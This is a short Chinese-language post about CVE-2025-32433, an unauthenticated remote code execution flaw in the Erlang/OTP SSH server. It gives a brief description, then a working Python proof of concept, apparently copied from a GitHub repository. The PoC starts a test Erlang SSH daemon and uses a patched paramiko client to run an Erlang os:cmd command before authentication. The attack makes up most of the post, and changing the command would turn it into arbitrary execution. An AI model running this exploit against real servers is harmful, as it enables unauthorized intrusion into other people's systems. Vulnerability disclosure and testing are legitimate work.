# Erlang-OTP中的SSH服务器存在RCE漏洞

# 一、漏洞简介
Erlang/OTP SSH 服务器中发现了一个严重漏洞，可能允许攻击者执行未经身份验证的远程代码执行 (RCE)。通过利用 SSH 协议消息处理中的缺陷，恶意行为者可以未经授权访问受影响的系统，并在没有有效凭证的情况下执行任意命令。

# 二、影响版本
所有运行 Erlang/OTP SSH 服务器的用户都会受到此漏洞的影响，无论底层 Erlang/OTP 版本如何。如果您的应用程序使用 Erlang/OTP SSH 库提供 SSH 访问，则假设您已受到影响。

# 三、python脚本
```python
# Example server commands, copied from https://blog.differentpla.net/blog/2022/11/01/erlang-ssh/.
```sh
mkdir /tmp/erlang-ssh-server/
ssh-keygen -q -N "" -t rsa -f /tmp/erlang-ssh-server/ssh_host_rsa_key
erl
```

```erl
{ok, _} = application:ensure_all_started(ssh).
Port = 2222.
ssh:daemon(Port, [{system_dir, "/tmp/erlang-ssh-server/"}]).
```

# Uncomment checks in paramiko channel.py#L67, transport.py#L1087-1088, transport.py#L1119-1129

import socket
import multiprocessing
import paramiko

server_address = ("localhost", 2222)
client = paramiko.SSHClient()

try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(server_address)
except socket.error as e:
    print(f"Error connecting to {server_address}: {e}")
    exit(1)

# Exploit inspired by comment on https://news.ycombinator.com/item?id=43718329

try:
    transport = paramiko.Transport(client_socket)
    transport.start_client()
except Exception as e:
    print(f"An unexpected error occurred during SSH client startup: {e}")
    transport.close()
    exit(1)

channel = transport.open_session()
channel.exec_command('os:cmd("mktemp -t CVE-2025-32433-XXXXX").')
# Hangs if successful. If you get the unimplemented error message, it was unsuccesful.
```

> 原文: <https://github.com/darses/CVE-2025-32433>
